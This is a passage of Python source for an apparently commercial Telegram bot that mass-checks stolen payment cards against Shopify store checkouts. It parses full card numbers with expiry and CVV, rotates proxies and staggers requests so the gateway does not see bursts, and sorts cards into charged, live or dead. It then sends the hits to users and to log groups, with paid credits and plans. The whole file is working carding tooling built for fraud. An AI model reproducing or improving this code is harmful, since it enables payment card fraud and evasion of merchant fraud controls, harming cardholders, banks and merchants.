# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _update_progress(bot, sid: str, force: bool = False):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return
    now = time.time()
    if not force and (now - sess.get("last_update", 0)) < 1.0:
        return
    text    = _progress_text(sess)
    running = sess["status"] == "CHECKING"
    if text == sess.get("last_text") and not force:
        return
    try:
        await bot.edit_message_text(
            chat_id=sess["chat_id"], message_id=sess["msg_id"],
            text=text, parse_mode="HTML",
            reply_markup=_msh_buttons(sid, running),
            disable_web_page_preview=True,
        )
        sess["last_text"]   = text
        sess["last_update"] = now
    except Exception:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE BUILDER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _make_result_file(sess: dict, kind: str) -> tuple:
    if kind == "live":
        cards = sess.get("live_cards", [])
        label = "Live"
    elif kind == "dead":
        cards = sess.get("dead_cards", [])
        label = "Dead"
    else:
        cards = (sess.get("charged_cards", []) + sess.get("live_cards", [])
                 + sess.get("dead_cards",   []) + sess.get("error_cards", []))
        label = "All"

    uname = (sess.get("user_obj") and
             (getattr(sess["user_obj"], "first_name", None) or "User")) or "User"
    plan  = sess.get("plan", "TRIAL")

    lines = [
        f"Gate ➳ Shopify | 0-5 USD",
        f"Result ➳ {label}",
        f"Total ➳ {len(cards)}",
        f"User ➳ {uname} ({plan})",
        f"Dev ➳ {BOT_NAME}",
        "━━━━━━━━━━━━━━",
    ]
    for cd in cards:
        bi   = cd.get("bin_info", {})
        flag = bi.get("country_emoji", "")
        cdisp = f"{flag} {bi.get('country','N/A')}".strip() if flag else bi.get("country","N/A")
        resp = cd.get("resp", cd.get("response", "N/A"))
        ver  = cd.get("verdict", "N/A")
        prc  = cd.get("price", "0.00")
        cur  = cd.get("currency", "USD")

        if "ORDER_PAID" in resp.upper() or ver == "CHARGED":
            status = "Charged"; raw_disp = f"{resp} | {prc} {cur}"
        elif ver in ("LIVE", "TDS"):
            status = "Live";    raw_disp = resp
        elif ver == "DEAD":
            status = "Dead";    raw_disp = resp
        else:
            status = "Error";   raw_disp = resp

        lines += [
            f"Card ➳ {cd.get('card','N/A')}",
            f"Status ➳ {status}",
            f"Gate ➳ Shopify | {prc} {cur}",
            f"Resp ➳ {raw_disp}",
            f"Brand ➳ {bi.get('scheme','N/A')}",
            f"Issuer ➳ {bi.get('bank','N/A')}",
            f"Country ➳ {cdisp}",
            "━━━━━━━━━━━━━━",
        ]

    buf   = BytesIO("\n".join(lines).encode("utf-8"))
    buf.seek(0)
    fname = f"BatChk_{label.upper()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    return buf, fname, len(cards)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATION  — DM + log groups
# CHARGED → user DM + HIT_LOG_GROUP + EXTRA_CHARGED_GROUP
# LIVE    → user DM only
# DEAD    → nothing
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _send_hit(bot, user, text: str, verdict: str):
    """Send CHARGED/LIVE hit to user DM and/or log groups."""

    # ── 1. User DM (CHARGED and LIVE) ───────────────────
    try:
        await bot.send_message(
            chat_id=user.id, text=text,
            parse_mode="HTML", disable_web_page_preview=True,
        )
    except Exception as e:
        logging.warning(f"[HIT] DM failed uid={user.id}: {e}")

    # ── 2. Hit-log group (CHARGED and LIVE) ─────────────
    if HIT_LOG_GROUP_ID:
        try:
            eid   = (random.choice(CHARGED_EMOJI_IDS) if verdict == "CHARGED"
                     else LIVE_EMOJI_ID)
            label = "Charged" if verdict == "CHARGED" else "Live"
            grp   = (
                f'<b>{_te(HIT_GATE_EMOJI_ID,"🛒")} {label} {_te(eid,"💎" if verdict=="CHARGED" else "✅")}</b>\n'
                f'<b>Gate ➳ Shopify Payments</b>\n'
                f'<b>{_te(HIT_RESP_EMOJI_ID,"✅")} User ➳ {_user_link(user)}</b>'
            )
            await bot.send_message(
                chat_id=HIT_LOG_GROUP_ID, text=grp,
                parse_mode="HTML", disable_web_page_preview=True,
            )
        except Exception as e:
            logging.warning(f"[HIT] Log group failed: {e}")

    # ── 3. Extra charged group (CHARGED only) ───────────
    if verdict == "CHARGED" and EXTRA_CHARGED_GROUP_ID:
        try:
            await asyncio.sleep(0.5)
            await bot.send_message(
                chat_id=EXTRA_CHARGED_GROUP_ID, text=text,
                parse_mode="HTML", disable_web_page_preview=True,
            )
        except Exception as e:
            logging.warning(f"[HIT] Extra group failed: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SESSION FACTORY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def create_msh_session(
    sid, chat_id, user_id, msg_id, user_msg_id,
    total, user_obj, plan,
) -> dict:
    sess = {
        "status":   "CHECKING",
        "chat_id":  chat_id, "user_id": user_id,
        "msg_id":   msg_id,  "user_msg_id": user_msg_id,
        "total":    total,   "checked": 0,
        "charged":  0, "approved": 0, "dead": 0, "errors": 0,
        "start_time": time.time(),
        "charged_cards": [], "live_cards": [],
        "dead_cards":    [], "error_cards": [], "tds_cards": [],
        "tasks": [], "last_text": "", "last_update": 0,
        "user_obj": user_obj, "plan": plan,
        "plan_eid": _plan_eid(plan),
    }
    MSH_SESSIONS[sid] = sess
    return sess

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CHECK WORKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies):
    sess = MSH_SESSIONS.get(sid)
    if not sess: return

    effective_proxies = proxies if proxies else _ALL_PROXIES
    if not effective_proxies:
        effective_proxies = _load_proxies()

    logging.info(f"[MSH] {sid} — {len(effective_proxies)} proxies, "
                 f"{len(valid_cards)} cards, concurrency={MAX_CONCURRENT}")

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def worker(card_fmt: str, cc_num: str):
        if sess.get("status") != "CHECKING": return
        async with sem:
            if sess.get("status") != "CHECKING": return
            t0 = time.time()
            try:
                verdict, resp, price, currency = await _check_card_with_retry(
                    None, card_fmt, all_sites, effective_proxies,
                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT, sid=sid,
                )
            except asyncio.CancelledError:
                return
            except Exception as e:
                verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"

            elapsed = time.time() - t0
            try:
                bin_data = await asyncio.wait_for(_bin_lookup(cc_num[:6]), timeout=5)
            except Exception:
                bin_data = {}

            rec = {
                "card": card_fmt, "verdict": verdict,
                "resp": resp, "response": resp,
                "price": price, "currency": currency,
                "bin_info": bin_data,
            }
            sess["checked"] += 1

            if verdict == "CHARGED":
                sess["charged"] += 1
                sess["charged_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                # CHARGED → DM + log groups
                asyncio.create_task(_send_hit(bot, user, msg, "CHARGED"))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "TDS":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                sess["tds_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                # TDS (live) → DM only
                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "LIVE":
                sess["approved"] += 1
                sess["live_cards"].append(rec)
                msg = build_result_msg(card_fmt, resp, verdict, bin_data,
                                       price, currency, elapsed, user, plan)
                # LIVE → DM only
                asyncio.create_task(_send_hit(bot, user, msg, "LIVE"))
                asyncio.create_task(_update_progress(bot, sid, force=True))

            elif verdict == "DEAD":
                sess["dead"] += 1
                sess["dead_cards"].append(rec)
                # DEAD → no DM, no notification

            else:  # ERROR
                sess["errors"] += 1
                sess["error_cards"].append(rec)

            # Periodic progress update
            if sess["checked"] % 5 == 0 or sess["checked"] >= sess["total"]:
                asyncio.create_task(_update_progress(bot, sid))

    # Stagger task creation: don't launch all workers in the same millisecond.
    # With MAX_CONCURRENT=12 and the per-attempt sleep inside _check_card_with_retry,
    # the gateway sees a steady stream instead of a 200-request burst at t=0.
    tasks = []
    for i, (cf, cn) in enumerate(valid_cards):
        if sess.get("status") != "CHECKING":
            break
        t = asyncio.create_task(worker(cf, cn))
        tasks.append(t)
        # Stagger every batch of MAX_CONCURRENT: give the first wave time to
        # enter the semaphore before the next batch queues up.
        if (i + 1) % MAX_CONCURRENT == 0:
            await asyncio.sleep(random.uniform(0.5, 1.0))

    sess["tasks"] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)

    if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
        MSH_SESSIONS[sid]["status"] = "FINISHED"
    await _update_progress(bot, sid, force=True)
    logging.info(
        f"[MSH] {sid} done  C:{sess['charged']} L:{sess['approved']} "
        f"D:{sess['dead']} E:{sess['errors']}"
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 2)
    if len(parts) < 3:
        await q.answer("❌ Invalid.", show_alert=True); return

    _, sid, kind = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Session expired.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return

    # Button lock
    locked_for = int(BUTTON_LOCK - (time.time() - sess["start_time"]))
    if locked_for > 0:
        await q.answer(f"⏳ Wait {locked_for}s", show_alert=True); return

    buf, fname, count = _make_result_file(sess, kind)
    if count == 0 and kind != "all":
        label = {"live": "Live"}.get(kind, kind.capitalize())
        await q.answer(f"❌ No {label} cards yet.", show_alert=True); return

    await q.answer("📦 Generating file…")

    labels = {"live": "Live ✅", "all": "All 📁"}
    caption = (
        f"<b>Result ➳ {labels.get(kind,'All')}</b>\n"
        f"<b>Total ➳ {count}</b>\n"
        f"<b>Gate ➳ Shopify Mass</b>"
    )
    try:
        await context.bot.send_document(
            chat_id=q.message.chat_id,
            document=InputFile(buf, filename=fname),
            caption=caption, parse_mode="HTML",
            reply_to_message_id=sess.get("user_msg_id"),
        )
    except Exception as e:
        logging.error(f"[MSH] send_document: {e}")
        try:
            buf.seek(0)
            await context.bot.send_document(
                chat_id=q.message.chat_id,
                document=InputFile(buf, filename=fname),
                caption=caption, parse_mode="HTML",
            )
        except Exception:
            pass


async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q     = update.callback_query
    parts = q.data.split(":", 1)
    if len(parts) < 2:
        await q.answer("❌ Invalid.", show_alert=True); return

    _, sid = parts
    sess = MSH_SESSIONS.get(sid)
    if not sess:
        await q.answer("⚠️ Already finished.", show_alert=True); return
    if q.from_user.id != sess.get("user_id"):
        await q.answer("❌ Not your session.", show_alert=True); return
    if sess["status"] != "CHECKING":
        await q.answer("ℹ️ Not running.", show_alert=True); return

    # Stop immediately
    sess["status"] = "STOPPED"
    for t in sess.get("tasks", []):
        if not t.done(): t.cancel()

    await q.answer("🛑 Stopped.")
    sess["last_text"] = ""
    await _update_progress(context.bot, sid, force=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh — SINGLE CARD COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ud   = _get_ud(user.id, context)

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(
            "🔧 <b>Bot under maintenance.</b>", parse_mode="HTML"); return
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "❌ <b>Single check disabled.</b>", parse_mode="HTML"); return

    # Parse card
    card = None
    if context.args:
        card = context.args[0].strip()
    elif update.message.reply_to_message:
        txt = (update.message.reply_to_message.text or
               update.message.reply_to_message.caption or "").strip()
        if txt: card = txt.split()[0]

    if not card or "|" not in card:
        await update.message.reply_text(
            "ℹ️ <b>Usage:</b> <code>/sh cc|mm|yy|cvv</code>",
            parse_mode="HTML"); return

    parts = card.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format.", parse_mode="HTML"); return

    cc, mm, yy, cvv = parts
    if not luhn_check(cc):
        await update.message.reply_text("❌ Card failed Luhn check.", parse_mode="HTML"); return
    if is_expired(mm, yy):
        await update.message.reply_text("❌ Card is expired.", parse_mode="HTML"); return

    # Credits / cooldown
    premium = _is_premium(ud, user.id)
    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
        cd_map = context.bot_data.setdefault("sh_cd", {})
        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
        if rem > 0:
            await update.message.reply_text(
                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
                parse_mode="HTML"); return
        cd_map[user.id] = time.time()
        ud["credits"]   = max(0, ud.get("credits", 1) - 1)

    plan = ud.get("plan", "TRIAL")

    # Show spinner with new UI style
    spin = await update.message.reply_text(
        f'<b>{_te(PROG_GATE_EMOJI_ID,"🛒")} Gate ➳ Shopify</b>\n'
        f'<b>{_te(PROG_PROGRESS_EMOJI_ID,"🔄")} Checking...</b>',
        parse_mode="HTML",
    )

    sites   = _load_sites()
    proxies = _load_proxies()

    if not proxies:
        await spin.edit_text(
            "❌ <b>No proxies in px.txt</b>\n\n"
            "The API requires proxies. Add them to <code>px.txt</code>.",
            parse_mode="HTML"); return

    t0 = time.time()
    try:
        (verdict, resp, price, currency), bin_data = await asyncio.gather(
            _check_card_with_retry(None, card, sites, proxies,
                                   max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT),
            _bin_lookup(cc[:6]),
        )
    except Exception as e:
        verdict, resp, price, currency = "ERROR", str(e)[:60], "0.00", "USD"
        bin_data = {}

    elapsed = time.time() - t0
    text    = build_result_msg(card, resp, verdict, bin_data,
                               price, currency, elapsed, user, plan)

    # Button
    if verdict in ("CHARGED", "LIVE", "TDS"):
        kb = RawMarkup([[_btn(
            "💎 CHARGED" if verdict == "CHARGED" else "✅ LIVE",
            url=BOT_CHANNEL, style="primary",
        )]])
    else:
        kb = RawMarkup([[_btn("📢 Channel", url=BOT_CHANNEL)]])

    try:
        await spin.edit_text(text, parse_mode="HTML",
                             disable_web_page_preview=True, reply_markup=kb)
    except Exception:
        await update.message.reply_text(text, parse_mode="HTML",
                                        disable_web_page_preview=True, reply_markup=kb)

    # DM for CHARGED / LIVE
    if verdict in ("CHARGED", "LIVE", "TDS"):
        asyncio.create_task(_send_hit(context.bot, user, text, verdict))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HANDLER EXPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    """Returns CommandHandler('sh', cmd_sh). main.py: app.add_handler(get_sh_handler())"""
    return CommandHandler("sh", cmd_sh)
